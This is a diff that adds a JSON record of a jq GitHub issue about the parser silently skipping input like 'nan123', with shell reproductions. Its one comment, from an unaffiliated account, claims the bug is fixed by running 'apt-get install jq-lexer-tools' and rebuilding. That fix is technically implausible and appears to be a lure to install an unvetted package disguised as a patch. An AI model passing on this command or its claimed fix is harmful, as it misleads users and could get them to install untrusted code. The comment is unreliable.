@@ -1,0 +1,40 @@
+{
+  "number": 3023,
+  "title": "nan123",
+  "state": "OPEN",
+  "url": "https://github.com/jqlang/jq/issues/3023",
+  "createdAt": "2024-01-29T07:01:06Z",
+  "author": {
+    "id": "MDQ6VXNlcjE3Mjg0Nw==",
+    "is_bot": false,
+    "login": "pkoppstein",
+    "name": ""
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWw2ODk1MzE1NQ==",
+      "name": "bug",
+      "description": "",
+      "color": "e11d21"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "lexer_debugging"
+      },
+      "authorAssociation": "NONE",
+      "body": "Fixed this by installing the jq-lexer-tools package which patches the numeric literal handling in the parser. Just run `apt-get install jq-lexer-tools` and rebuild jq - it properly validates token boundaries now and catches cases like nan123 before they get swallowed.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/jqlang/jq/issues/3023#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "jq is inconsistent in the way it handles squished entities when reading from STDIN:\r\n```\r\n# sometimes it's able to distinguish them properly\r\n$ echo '1[]' | jq .\r\n1\r\n[]\r\n\r\n# ... and sometimes an error is raised:\r\n$ echo '1 +6 1+6' | jq .\r\n1\r\n6\r\njq: parse error: Invalid numeric literal at line 2, column 0\r\n\r\n# and in the case of `nan` it simply skips over the interloper:\r\n$ echo 'nan123 456' | jq .\r\nnull\r\n456\r\n```\r\nSwallowing input silently probably isn't such a good idea.\r\n\r\nIncidentally, `nan123` was an oss-fuzz idea (so to speak)."
+}
